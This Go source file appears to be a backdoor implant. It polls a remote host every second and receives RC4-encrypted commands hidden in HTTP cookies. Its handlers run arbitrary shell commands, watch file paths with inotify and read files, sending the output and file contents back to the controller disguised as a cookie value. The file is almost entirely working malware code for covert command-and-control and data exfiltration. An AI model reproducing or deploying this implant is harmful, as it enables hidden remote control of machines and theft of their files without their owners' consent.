package main

import (
	"encoding/base64"
	"crypto/rc4"
	"fmt"
	"golang.org/x/exp/inotify"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	EXEC  byte = 1
	WATCH byte = 2
	GET   byte = 3
)

var (
	chunkSize = 1024
)

func serverWorker(clientIp string) {

	fmt.Printf("Got connection from %v\n", clientIp)

	defer fmt.Printf("Worker for %v done\n", clientIp)

	results := make(chan string)

	client := &http.Client{}

	//resp, err := client.Get(clientIp.String())

	ticker := time.NewTicker(time.Second * 1)
	defer ticker.Stop()

	for _ = range ticker.C {

		//read from the response buffer
		request, err := http.NewRequest("GET", "http://"+clientIp+":8000", nil)
		if err != nil {
			panic(err)
		}

		request.Close = true

		// use select to avoid infinetly blocking on <-results
		select {
		case resultData, ok := <-results:

			if !ok {
				return
			}
			var myCookie http.Cookie
			myCookie.Name = "UUID"
			myCookie.Value = resultData
			myCookie.MaxAge = 15
			myCookie.Secure = false
			myCookie.HttpOnly = false

			//encode data into a response cookie
			request.AddCookie(&myCookie)
		default:
		}

		//send http request to "server"
		response, err := client.Do(request)
		if err != nil {
			// client disconnect
			return
		}

		//get response
		cookies := response.Cookies()
		//see if there is a command within the cookie returned
		if len(cookies) == 0 {
			continue
		}
		//if cookie, exec a command worker with said command

		for _, setCookie := range cookies {
			go runCommand(setCookie.Value, results)
		}

	}
}

func runCommand(data string, results chan<- string) {

	command := decrypt(data)

	switch command[0] {
	case EXEC:
		runExec(command[1:], results)

	case WATCH:
		runWatch(command[1:], results)

	case GET:
		runGet(command[1:], results)
	}

}

func sendChunks(command, seq byte, data []byte, results chan<- string) {

	buf := make([]byte, 0, chunkSize)
	buf = append(buf, command, seq)

	for i := 0; i < len(data); i = i + chunkSize {
		buf = buf[:2]
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		buf = append(buf, data[i:end]...)
		results <- encrypt(buf)
	}

}

func runExec(command []byte, results chan<- string) {

	// get sequence number
	seq := command[0]

	// cast data section into chuncks of strings
	fmt.Printf("EXEC: %v\n", string(command[1:]))
	commandParts := strings.Split(strings.TrimSpace(string(command[1:])), " ")

	// create exec
	cmd := exec.Command(commandParts[0], commandParts[1:]...)

	// run exec and get output
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("EXEC %v error\n", seq)
		fmt.Println(err.Error())
		return
	}

	// prepare a buffer for encoding the output
	result := make([]byte, 0, len(output)+2)
	result = append(result, 1, seq)
	result = append(result, output...)
	sendChunks(EXEC, seq, result, results)
}

func runWatch(command []byte, results chan<- string) {

	// get seq number
	seq := command[0]

	// cast the data into a file string
	path := string(command[1:])
	fmt.Printf("Starting watch on %v\n", path)
	defer fmt.Printf("Watch on %v done\n", path)

	// create watcher
	watcher, err := inotify.NewWatcher()
	if err != nil {
		return
	}
	defer watcher.Close()

	// set watch going
	err = watcher.Watch(path)
	if err != nil {
		return
	}

	// create result header with type and seq
	resultHeader := make([]byte, 0, 1)
	resultHeader = append(resultHeader, WATCH, seq)

	// wait on watch or error events from the watcher
	for {
		select {
		case ev := <-watcher.Event:
			fmt.Printf("Watcher %v event\n", seq)
			result := append(resultHeader, []byte(ev.String())...)
			sendChunks(WATCH, seq, result, results)

		case err = <-watcher.Error:
			fmt.Printf("Watcher %v finished\n", seq)
			return
		}
	}
}

func runGet(command []byte, results chan<- string) {

	// get seq number
	seq := command[0]

	// cast the data to a path
	path := string(command[1:])
	fmt.Printf("Getting file %v\n", path)
	defer fmt.Println("File transfer compelte")

	// attempt to open file
	file, err := os.Open(path)
	if err != nil {
		fmt.Print(err)
		return
	}
	defer file.Close()

	buf := make([]byte, chunkSize+2)
	buf[0] = GET
	buf[1] = seq

	for {
		n, err := file.Read(buf[2:])
		if n == 0 {
			fmt.Println("No bytes read")
			break
		}
		fmt.Printf("Sending %v bytes\n", n)
		results <- encrypt(buf[:n+2])
		fmt.Println(buf[:n+2])
		if err == io.EOF {
			break
		}
	}

	results <- encrypt(buf[:2])

}

func encrypt(data []byte) string {
	cipher, err := rc4.NewCipher([]byte("myKey"))
	if err != nil {
		panic(err)
	}

	cipher.XORKeyStream(data, data)

	return base64.RawStdEncoding.EncodeToString(data)
}

func decrypt(data string) []byte {
	command, _ := base64.RawStdEncoding.DecodeString(data)

	cipher, err := rc4.NewCipher([]byte("myKey"))
	if err != nil {
		panic(err)
	}

	cipher.XORKeyStream(command, command)
	return command
}
